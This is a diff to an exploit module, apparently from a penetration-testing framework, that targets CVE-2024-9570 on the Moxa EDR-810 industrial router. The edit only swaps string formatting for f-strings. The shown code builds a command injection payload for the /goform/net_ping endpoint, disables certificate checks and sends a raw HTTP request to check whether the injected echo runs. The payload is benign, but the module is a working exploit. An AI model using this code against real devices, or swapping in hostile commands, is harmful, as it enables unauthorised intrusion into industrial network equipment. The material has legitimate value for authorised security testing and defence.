@@ -92,20 +92,20 @@ class Exploit(Exploit):
             print_info("CVE-2024-9571: companion stack overflow in same device")
             return
 
-        print_status("[CVE-2024-9570] Targeting Moxa EDR-810 at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2024-9570] Targeting Moxa EDR-810 at {self.target}:{self.port} ...")
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
 
         # Command injection in /goform/net_ping diagnostic endpoint
         INJECT = "127.0.0.1;echo CVE-2024-9570-PWNED"
-        params = "target={}&count=1".format(INJECT)
+        params = f"target={INJECT}&count=1"
         http_req = (
-            "POST /goform/net_ping?{} HTTP/1.1\r\n"
-            "Host: {}:{}\r\n"
+            f"POST /goform/net_ping?{params} HTTP/1.1\r\n"
+            f"Host: {self.target}:{self.port}\r\n"
             "Connection: close\r\n"
             "\r\n"
-        ).format(params, self.target, self.port).encode()
+        ).encode()
 
         try:
             s = socket.create_connection((self.target, self.port), timeout=10)
@@ -136,8 +136,8 @@ class Exploit(Exploit):
             elif "403" in resp_str or "401" in resp_str:
                 print_warning("[CVE-2024-9570] Auth required — this endpoint may be patched or protected")
             else:
-                print_info("[CVE-2024-9570] Response: {}".format(resp_str[:100]))
+                print_info(f"[CVE-2024-9570] Response: {resp_str[:100]}")
         except ConnectionRefusedError:
-            print_warning("[CVE-2024-9570] Connection refused on port {}".format(self.port))
+            print_warning(f"[CVE-2024-9570] Connection refused on port {self.port}")
         except Exception as exc:
-            print_error("[CVE-2024-9570] Error: {}".format(exc))
+            print_error(f"[CVE-2024-9570] Error: {exc}")
